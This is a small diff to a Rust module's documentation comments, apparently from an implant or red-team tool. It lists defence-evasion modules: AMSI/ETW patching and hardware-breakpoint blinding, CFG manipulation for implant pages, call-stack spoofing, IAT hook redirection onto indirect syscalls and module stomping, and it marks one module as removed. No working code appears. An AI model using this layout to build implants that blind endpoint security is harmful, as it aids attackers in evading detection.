@@ -15,7 +15,8 @@
 //! - [`blind`] — AMSI/ETW userland byte-patch (idempotent; AMSI retried/cycle).
 //! - [`blind_hwbp`] — hardware-breakpoint (DR0-7) ETW/AMSI blinding via VEH.
 //! - [`cfg_user`] — user-mode CFG bitmap extension for implant code pages.
-//! - [`proxy_veh`] — VEH proxy gadgets (`jmp rbx`) for indirect-call chains.
+//! - [`proxy_veh`] — removed proxy-VEH prototypes (empty module shell kept
+//!   for the shell crate's re-export; see the module docs).
 //! - [`caller_spoof`] — CET/IBC status probe for call-stack spoofing.
 //! - [`hookchain`] — IAT hook-chain redirect onto indirect-syscall stubs.
 //! - [`lacuna`] / [`lacuna_stomp`] — ghost-region scan + module stomping.
